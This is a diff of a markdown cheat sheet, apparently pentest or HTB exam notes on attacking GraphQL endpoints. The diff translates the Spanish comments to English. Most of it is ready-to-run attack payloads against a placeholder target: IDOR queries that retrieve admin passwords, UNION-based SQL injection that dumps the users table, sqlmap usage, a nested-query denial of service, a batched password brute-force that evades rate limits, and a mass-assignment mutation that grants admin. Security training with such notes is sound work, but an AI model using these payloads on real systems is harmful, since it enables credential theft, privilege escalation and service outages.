@@ -13,26 +13,26 @@ sidebar:
 ## Fingerprinting and Localization
 
 ```bash
-# Endpoints comunes de GraphQL
+# Common GraphQL endpoints
 /graphql
 /api/graphql
 /graphql/v1
 /api/v1/graphql
 /graph
 
-# Verificar si hay GraphiQL (interfaz web interactiva)
+# Verify if GraphiQL is present (interactive web interface)
 curl -s http://TARGET/graphql | grep -i "graphiql\|graphql"
 
-# graphw00f — fingerprint del engine
+# graphw00f — engine fingerprint
 git clone https://github.com/dolevf/graphw00f
 cd graphw00f
 pip3 install -r requirements.txt
 
 python3 main.py -d -f -t http://TARGET
-# Engines detectados: Graphene, Apollo, Hasura, GraphQL-Go, Sangria, etc.
-# -d: detect endpoint automáticamente
-# -f: fingerprint del engine
-# También devuelve enlace al GraphQL-Threat-Matrix con configuraciones por defecto
+# Detected engines: Graphene, Apollo, Hasura, GraphQL-Go, Sangria, etc.
+# -d: detect endpoint automatically
+# -f: engine fingerprint
+# Also returns link to the GraphQL-Threat-Matrix with default configurations
 ```
 
 ---
@@ -42,7 +42,7 @@ python3 main.py -d -f -t http://TARGET
 ### Basic Introspection Queries
 
 ```graphql
-# Listar todos los tipos
+# List all types
 {
   __schema {
     types {
@@ -51,7 +51,7 @@ python3 main.py -d -f -t http://TARGET
   }
 }
 
-# Campos de un tipo específico
+# Fields of a specific type
 {
   __type(name: "UserObject") {
     name
@@ -65,7 +65,7 @@ python3 main.py -d -f -t http://TARGET
   }
 }
 
-# Queries disponibles
+# Available queries
 {
   __schema {
     queryType {
@@ -77,7 +77,7 @@ python3 main.py -d -f -t http://TARGET
   }
 }
 
-# Mutations disponibles + argumentos
+# Available mutations + arguments
 query {
   __schema {
     mutationType {
@@ -94,7 +94,7 @@ query {
   }
 }
 
-# Campos de un tipo de input (para mutations)
+# Fields of an input type (for mutations)
 {
   __type(name: "RegisterUserInput") {
     name
@@ -161,17 +161,17 @@ fragment TypeRef on __Type {
 ### cURL with Introspection
 
 ```bash
-# Query via cURL (escapar comillas dentro del JSON)
+# Query via cURL (escape quotes within JSON)
 curl -s -X POST http://TARGET/graphql \
      -H "Content-Type: application/json" \
      -d '{"query":"{ __schema { types { name } } }"}' | jq
 
-# Listar queries
+# List queries
 curl -s -X POST http://TARGET/graphql \
      -H "Content-Type: application/json" \
      -d '{"query":"{ __schema { queryType { fields { name description } } } }"}' | jq
 
-# Tipos de un objeto
+# Types of an object
 curl -s -X POST http://TARGET/graphql \
      -H "Content-Type: application/json" \
      -d '{"query":"{ __type(name: \"UserObject\") { name fields { name type { name kind } } } }"}' | jq
@@ -182,25 +182,25 @@ curl -s -X POST http://TARGET/graphql \
 ## IDOR in GraphQL
 
 ```bash
-# 1. Identificar query que usa argumento de usuario
-# Ej: user(username: "htb-stdnt") { id username role }
+# 1. Identify query that uses user argument
+# E.g.: user(username: "htb-stdnt") { id username role }
 
-# 2. Cambiar el argumento al usuario objetivo
+# 2. Change the argument to the target user
 curl -s -X POST http://TARGET/graphql \
      -H "Content-Type: application/json" \
      -d '{"query":"{ user(username: \"admin\") { id username role } }"}' | jq
 
-# 3. Añadir campo password (identificado via introspección)
+# 3. Add password field (identified via introspection)
 curl -s -X POST http://TARGET/graphql \
      -H "Content-Type: application/json" \
      -d '{"query":"{ user(username: \"admin\") { username password } }"}' | jq
 
-# Enumerar todos los usuarios con su password
+# Enumerate all users with their password
 curl -s -X POST http://TARGET/graphql \
      -H "Content-Type: application/json" \
      -d '{"query":"{ users { id username password role } }"}' | jq
 
-# IDOR por ID numérico
+# IDOR by numerical ID
 for i in $(seq 1 50); do
     curl -s -X POST http://TARGET/graphql \
          -H "Content-Type: application/json" \
@@ -213,38 +213,38 @@ done
 ## SQL Injection in GraphQL
 
 ```graphql
-# 1. Confirmar SQLi — inyectar comilla simple
+# 1. Confirm SQLi — inject single quote
 {
   user(username: "htb-stdnt'") {
     username
   }
 }
-# Si responde con error SQL → vulnerable
+# If it responds with SQL error -> vulnerable
 
-# 2. Boolean blind — comentar el resto del WHERE
+# 2. Boolean blind — comment out the rest of the WHERE
 {
   user(username: "htb-stdnt' --") {
     username
   }
 }
-# Si devuelve el mismo resultado que sin payload → comentario funciona → SQLi confirmado
+# If it returns the same result as without payload -> comment works -> SQLi confirmed
 
-# 3. UNION-based — enumerar tablas
-# (adaptar el número de columnas al resultado de introspección)
+# 3. UNION-based — enumerate tables
+# (adapt the number of columns to the introspection result)
 {
   user(username: "x' UNION SELECT 1,2,GROUP_CONCAT(table_name),4,5,6 FROM information_schema.tables WHERE table_schema=database()-- -") {
     username
   }
 }
 
-# 4. UNION — dump de columnas de una tabla
+# 4. UNION — dump of columns of a table
 {
   user(username: "x' UNION SELECT 1,2,GROUP_CONCAT(column_name),4,5,6 FROM information_schema.columns WHERE table_name='users'-- -") {
     username
   }
 }
 
-# 5. UNION — extraer datos
+# 5. UNION — extract data
 {
   user(username: "x' UNION SELECT 1,2,GROUP_CONCAT(username,0x3a,password SEPARATOR 0x0a),4,5,6 FROM users-- -") {
     username
@@ -253,12 +253,12 @@ done
 ```
 
 ```bash
-# Via cURL (escapar comillas dobles con \")
+# Via cURL (escape double quotes with \")
 curl -s -X POST http://TARGET/graphql \
      -H "Content-Type: application/json" \
      -d '{"query":"{ user(username: \"x'"'"' UNION SELECT 1,2,GROUP_CONCAT(table_name),4,5,6 FROM information_schema.tables WHERE table_schema=database()-- -\") { username } }"}' | jq
 
-# SQLMap contra GraphQL (experimentar con --data y --level)
+# SQLMap against GraphQL (experiment with --data and --level)
 sqlmap -u "http://TARGET/graphql" \
        --data='{"query":"{ user(username: \"*\") { username } }"}' \
        --headers="Content-Type: application/json" \
@@ -270,10 +270,10 @@ sqlmap -u "http://TARGET/graphql" \
 ## DoS — Circular Query
 
 ```graphql
-# Identificar loop en Voyager: ej. UserObject.posts → PostObject.author → UserObject
-# Explotar el loop anidando niveles (respuesta crece exponencialmente)
+# Identify loop in Voyager: e.g. UserObject.posts -> PostObject.author -> UserObject
+# Exploit the loop nesting levels (response grows exponentially)
 
-# Nivel 3 — baseline (respuesta grande)
+# Level 3 — baseline (large response)
 {
   posts {
     author {
@@ -290,8 +290,8 @@ sqlmap -u "http://TARGET/graphql" \
   }
 }
 
-# Nivel alto — puede crashear el servidor/GraphiQL
-# (repetir el patrón posts → author → posts → edges → node → author... N veces)
+# High level — can crash the server/GraphiQL
+# (repeat the pattern posts -> author -> posts -> edges -> node -> author... N times)
 ```
 
 > **Note:** In CTFs/exams, demonstrating the vulnerability with 3-4 levels is sufficient for the report. It is not necessary to crash the actual server.
@@ -301,9 +301,9 @@ sqlmap -u "http://TARGET/graphql" \
 ## Batching — Brute-Force Rate Limit Bypass
 
 ```bash
-# Batching = múltiples queries en un solo HTTP request (JSON array)
+# Batching = multiple queries in a single HTTP request (JSON array)
 
-# Ejemplo: 2 queries normales en 1 request
+# Example: 2 normal queries in 1 request
 curl -s -X POST http://TARGET/graphql \
      -H "Content-Type: application/json" \
      -d '[
@@ -311,14 +311,14 @@ curl -s -X POST http://TARGET/graphql \
        {"query":"{ post(id: 1) { title } }"}
      ]' | jq
 
-# Brute-force de login via batching (evadir rate limit por request)
-# Generar JSON array con N queries de login diferentes:
+# Login brute-force via batching (bypass rate limit per request)
+# Generate JSON array with N different login queries:
 python3 -c "
 import json
 
 passwords = open('/usr/share/seclists/Passwords/Leaked-Databases/rockyou-75.txt').read().splitlines()
 batch = []
-for pwd in passwords[:500]:  # 500 intentos en 1 request
+for pwd in passwords[:500]:  # 500 attempts in a request
     batch.append({'query': f'mutation {{ login(username: \"admin\", password: \"{pwd}\") {{ token }} }}'})
 print(json.dumps(batch))
 " > batch_payload.json
@@ -333,10 +333,10 @@ curl -s -X POST http://TARGET/graphql \
 ## Mutations — Privilege Escalation
 
 ```graphql
-# 1. Descubrir mutations disponibles (ver sección introspección)
-# 2. Identificar campos privilegiados en el input (ej: "role")
+# 1. Discover available mutations (see introspection section)
+# 2. Identify privileged fields in the input (e.g. "role")
 
-# Registrar usuario normal
+# Register normal user
 mutation {
   registerUser(input: {
     username: "attacker"
@@ -348,7 +348,7 @@ mutation {
   }
 }
 
-# Mass Assignment en mutation: inyectar role:"admin"
+# Mass Assignment in mutation: inject role:"admin"
 mutation {
   registerUser(input: {
     username: "attacker_admin"
@@ -359,9 +359,9 @@ mutation {
     user { username role }
   }
 }
-# Si response refleja role:"admin" → escalada exitosa
+# If response reflects role:"admin" -> successful escalation
 
-# Otros campos privilegiados a probar en mutations:
+# Other privileged fields to test in mutations:
 # isAdmin: true
 # verified: true
 # approved: true
@@ -369,11 +369,11 @@ mutation {
 ```
 
 ```bash
-# MD5 de password para mutations que lo requieran
+# MD5 of password for mutations that require it
 echo -n 'password' | md5sum
-# → 5f4dcc3b5aa765d61d8327deb882cf99
+# -> 5f4dcc3b5aa765d61d8327deb882cf99
 
-# Ejecutar mutation via cURL
+# Execute mutation via cURL
 curl -s -X POST http://TARGET/graphql \
      -H "Content-Type: application/json" \
      -d '{"query":"mutation { registerUser(input: {username: \"attacker\", password: \"5f4dcc3b5aa765d61d8327deb882cf99\", role: \"admin\", msg: \"test\"}) { user { username role } } }"}' | jq
@@ -384,27 +384,27 @@ curl -s -X POST http://TARGET/graphql \
 ## GraphQL-Cop — Automated Audit
 
 ```bash
-# Instalación
+# Installation
 git clone https://github.com/dolevf/graphql-cop
 cd graphql-cop
 pip3 install -r requirements.txt
 
-# Audit básico (sin auth)
+# Basic audit (without auth)
 python3 graphql-cop.py -t http://TARGET/graphql
 
-# Con auth (bearer token)
+# With auth (bearer token)
 python3 graphql-cop.py -t http://TARGET/graphql \
      -H "Authorization: Bearer TOKEN"
 
-# Output típico:
+# Typical output:
 # [HIGH] Alias Overloading - DoS via 100+ aliases
-# [HIGH] Array-based Query Batching - Batching habilitado → brute-force amplification
-# [HIGH] Directive Overloading - DoS via directives duplicados
-# [HIGH] Field Duplication - DoS via 500 campos repetidos
-# [HIGH] Introspection - Información del schema expuesta
-# [MEDIUM] GET Method Query Support - CSRF posible
-# [LOW] Field Suggestions - Leakage de nombres de campo
-# [LOW] GraphiQL IDE - Interfaz de debug expuesta
+# [HIGH] Array-based Query Batching - Batching enabled -> brute-force amplification
+# [HIGH] Directive Overloading - DoS via duplicate directives
+# [HIGH] Field Duplication - DoS via 500 repeated fields
+# [HIGH] Introspection - Schema information exposed
+# [MEDIUM] GET Method Query Support - CSRF possible
+# [LOW] Field Suggestions - Leakage of field names
+# [LOW] GraphiQL IDE - Debug interface exposed
 ```
 
 ---
